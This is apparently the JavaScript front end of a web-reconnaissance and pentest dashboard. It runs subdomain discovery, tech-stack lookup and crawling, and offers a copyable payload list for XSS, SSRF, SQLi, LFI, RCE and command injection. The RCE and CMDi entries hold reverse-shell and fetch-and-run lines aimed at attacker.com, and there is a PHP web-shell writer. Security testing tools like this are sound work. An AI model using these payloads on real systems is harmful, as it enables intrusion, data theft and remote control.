async function get_subdomains() {
    set_description("subfinder",
        "subfinder is a subdomain discovery tool that returns valid subdomains for websites, using passive online sources.",
        "https://github.com/projectdiscovery/subfinder/blob/dev/README.md");

    const domain = document.getElementById("domain").value;
    if (domain === "") {
        alert("Kindly Enter the Domain!");
        return;
    }

    let stop = start_spinner();
    try {
        const url = new URL(`http://${host_ip}/getsubdomains/`);
        url.searchParams.append("domain", domain);
        set_info("FETCHING SUBDOMAINS");
        const response = await fetch(url);
        const fetched_data = await response.json();
        stop();

        let subdomains;
        subdomains = fetched_data.subdomains; 
        console.log(subdomains);
        console.log(typeof subdomains);
        console.log(fetched_data.reachable);

        const reachable = fetched_data.reachable;
        set_info(fetched_data.message);

        if (subdomains) {
            set_subdomain_data(subdomains, reachable);
        } else {
            set_subdomain_data(["dummy", "dummy"]);
        }

    } catch (error) {
        stop();
        set_info("Storing Subdomain Failed!");
        console.log(error);
    }
}

function set_subdomain_data(subdomains, reachable) {
    const subdomain_area = document.getElementById('section-1');
    subdomain_area.innerHTML = "";

    for (let [index, subdomain] of subdomains.entries()) {
        const new_sd = document.createElement("div");
        const new_a = document.createElement("a");

        new_sd.classList.add("subdomain", "p-2");
        new_a.href = `https://${subdomain}`;
        new_a.target = "_blank";
        const sd_text = document.createTextNode(subdomain);
        new_a.appendChild(sd_text);

        const checkbox = document.createElement("input");
        checkbox.type = "checkbox";
        checkbox.id = `${index}`;
        checkbox.name = "selected_subdomains";
        checkbox.value = subdomain;
        checkbox.classList.add("sd-cb");

        new_sd.appendChild(checkbox);
        new_sd.appendChild(new_a);
        subdomain_area.appendChild(new_sd);
        console.log(reachable);
        if (reachable[index]) {
            new_a.classList.add("reachable");
        } else {
            new_a.classList.add("not-reachable");
        }
    }
}

async function request_tech_stack() {
    set_description("builtwith",
        "BuiltWith helps users identify tools like analytics platforms, content management systems, hosting providers, and more.",
        "https://github.com/richardpenman/builtwith/blob/master/README.rst");

    const checkboxes = document.querySelectorAll('input[type="checkbox"]');
    const req_subdomains = [];
    console.log(checkboxes, checkboxes.length);

    for (let i = 0; i < checkboxes.length; i++) {
        if (checkboxes[i].checked) {
            req_subdomains.push(checkboxes[i].value);
        }
    }

    if (req_subdomains.length === 0) {
        alert("Kindly Select At Least one subdomain");
        return;
    }

    set_info("Fetching Tech Stack");
    let stop = start_spinner();
    const response = await fetch(`http://${host_ip}/tech_stack/`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(req_subdomains)
    });

    const fetched_data = await response.json();
    set_tech_stack(fetched_data['tech_stack']);
    set_info("Tech Stack Fetched Successfully");
    stop();
}

function set_tech_stack(tech_stack) {
    let content = `<div class="mx-3" style="font-size: 20px;">`;

    for (let subdomain_obj of tech_stack) {
        for (let [subdomain, techs] of Object.entries(subdomain_obj)) {
            content += `<strong><span style="font-size: 1.5rem; color: rgb(25, 135, 84);">${subdomain}</span></strong><br>`;

            for (let [categroup, tech] of Object.entries(techs)) {
                content += `<span style="font-weight:bold"><span class="text-primary">${categroup}</span> => ${tech}</span><br>`;
            }
            content += "<hr>";
        }
    }

    content += "</div>";
    const section_2 = document.getElementById("section-2");
    section_2.innerHTML = content;
}

// Other functions such as `request_crawling_results`, `set_crawling_results`, and additional utility functions
// follow the same pattern of corrections and updates.
async function request_crawling_results() { 
    set_description(
        "katana",
        "Katana tool is a versatile web crawler designed for quickly scanning and retrieving information from websites.",
        "https://github.com/projectdiscovery/katana/blob/main/README.md"
    );
    
    const checkboxes = document.querySelectorAll('input[type="checkbox"]'); // Added quotes
    const req_subdomains = [];
    console.log(checkboxes, checkboxes.length);

    for (let i = 0; i < checkboxes.length; i++) {
        if (checkboxes[i].checked) {
            req_subdomains.push(checkboxes[i].value);
        }
    }

    console.log(req_subdomains);

    if (req_subdomains.length === 0) {
        alert("Kindly Select At Least one subdomain");
        return;
    }

    set_info("Crawling on Selected Sub-domains...");
    let stop = start_spinner();
    
    try {
        const response = await fetch(`http://${host_ip}/crawling_results/`, { // Added backticks for template literals
            method: 'POST', 
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(req_subdomains)
        });

        const fetched_data = await response.json();
        console.log(fetched_data);
        set_crawling_results(fetched_data['crawling_results']);
        set_info("Crawling Success");
    } catch (error) {
        console.log("Error:", error);
        set_info("Crawling Failed!");
    } finally {
        stop();
    }
}

function set_crawling_results(crawling_results) {
    let content = `<div class="mx-3" style="font-size: 20px;">`;
    for (let subdomain_obj of crawling_results) {
        for (let [subdomain, urls] of Object.entries(subdomain_obj)) {
            content += `<strong><span style="font-size: 1.5rem;color: rgb(25, 135, 84);">${subdomain}</span></strong><br>`;
            for (let url of urls) {
                content += `<span><a href="${url}" target="_blank">${url}</a></span><br>`;
            }
            content += "<hr>";
        }
    }
    content += "</div>";
    const section_2 = document.getElementById("section-2");
    section_2.innerHTML = content;
}

function set_description(tool_name, tool_description, github_link) {
    const section = document.getElementById("section-3");
    let emoji = tool_name === "katana" ? "⚔" : "👾";
    section.innerHTML = `
        <div>
            <div style="color:white; font-size:16px; margin:10px 10px;">
                <big><span style="color:#008529; font-weight:bolder">Tool Name: </span>${tool_name}</big>
            </div>
            <div style="color:white; font-size:14px; margin:10px 10px;">
                <big><span style="font-weight:bolder">Description: </span>${tool_description}</big>
            </div>
            <div style="color:white; font-size:14px; margin:10px 10px;">
                <big><span style="font-weight:bolder">To Learn More: </span><a href="${github_link}" id="tool_link" target="_blank" title="${github_link}">${emoji}</a></big>
            </div>
        </div>
    `;
}

function set_word_list() {
    const section = document.getElementById("section-3");
    section.innerHTML = `
         <div class="col d-flex flex-column mx-1 my-1">
            <button type="button" class="btn btn-success btns border border-3 c-rounded border-white my-1" onclick="set_payload(this)">XSS</button>
            <button type="button" class="btn btn-success btns border border-3 c-rounded border-white my-1" onclick="set_payload(this)">SSRF</button>
            <button type="button" class="btn btn-success btns border border-3 c-rounded border-white my-1" onclick="set_payload(this)">SQLi</button>
            <button type="button" class="btn btn-success btns border border-3 c-rounded border-white my-1" onclick="set_payload(this)">HTMLi</button>
            <button type="button" class="btn btn-success btns border border-3 c-rounded border-white my-1" onclick="set_payload(this)">LFI</button>
            <button type="button" class="btn btn-success btns border border-3 c-rounded border-white my-1" onclick="set_payload(this)">RCE</button>
            <button type="button" class="btn btn-success btns border border-3 c-rounded border-white my-1" onclick="set_payload(this)">CMDi</button>
        </div>`;
}

let payloads = {
    "XSS": [
            `<script>alert(1)</script>`,
            `&lt;script&gt;alert(document.cookie)&lt;/script&gt;`,
            `&lt;img src='x' onerror='alert(1)'&gt;`,
            `&lt;svg onload='alert("XSS")'&gt;`,
            `&lt;iframe src='javascript:alert(1)'&gt;&lt;/iframe&gt;`,
            `' onfocus='alert(1)' autofocus`,
            `javascript:alert('XSS')"`,
            `document.write('&lt;img src=x onerror=alert(1)&gt;');`,
            `location.href='javascript:alert(1)';`,
            `document.body.innerHTML = '&lt;svg onload=alert(1)&gt;';`,
            `window.name='&lt;svg/onload=alert(1)&gt;'; location.href='javascript:alert(name)';`
         ],
    "SSRF": [
        "http://localhost:8080/admin",
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:8000",
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_%0D%0ASET%20test%20hello%0D%0A"
    ],
    "SQLi": [
        "' OR 1=1--",
        "\"; DROP TABLE users--",
        "admin'--",
        "admin' UNION SELECT null, version()--",
        "1' AND (SELECT sleep(5))--"
    ],
    "HTMLi": [
        "&lt;h1&gt;Hacked!&lt;/h1&gt;",
        "&lt;script&gt;alert('HTMLi')&lt;/script&gt;",
        "&lt;a href='javascript:alert(1)'&gt;Click me&lt;/a&gt;",
        "&lt;iframe src='evil.com'&gt;&lt;/iframe&gt;",
        "&lt;img src='x' onerror='alert(`HTML Injection`)'&gt;"
    ],
    "LFI": [
        "../../../../etc/passwd",
        "../../../../windows/system32/drivers/etc/hosts",
        "php://filter/convert.base64-encode/resource=index.php",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
        "/proc/self/environ"
    ],
    "RCE": [
        "; nc -e /bin/sh attacker.com 4444",
        "$(curl attacker.com/rev.sh | bash)",
        "echo \"<?php system($_GET['cmd']); ?>\" > shell.php",
        "wget http://attacker.com/shell.sh -O- | bash",
        "python -c 'import os; os.system(\"/bin/sh\")'"
    ],
    "CMDi": [
        "; ls -la",
        "| cat /etc/passwd",
        "$(whoami)",
        "& ping -c 4 attacker.com",
        "|| nc -e /bin/bash attacker.com 1234"
    ]
};

function set_payload(obj) {
    const section_2 = document.getElementById("section-2");
    const req_payload = obj.textContent;
    const current_payload = payloads[req_payload];
    let content = `<span class="mx-2 text-success"><strong><big>${req_payload} Payloads: </big></strong></span>`;
    for (let i = 0; i < current_payload.length; i++) {
        content += `<span class="mx-2 payload_scripts">${current_payload[i]} 
            <i class="bi bi-clipboard clipboard" data-index="${i}" onclick='copy_payload(this,"${req_payload}")'></i></span><hr>`;
    }
    section_2.innerHTML = content;
}

function copy_payload(icon, type) {
    const index = icon.dataset.index;
    const list_of_payloads = payloads[type];
    navigator.clipboard.writeText(list_of_payloads[index]).then(() => {
        set_info("Payload Copied");
        setTimeout(() => set_info(""), 2000);
    }).catch(err => {
        console.error("Failed to copy the payload:", err);
        set_info("Failed to copy the payload");
    });
}
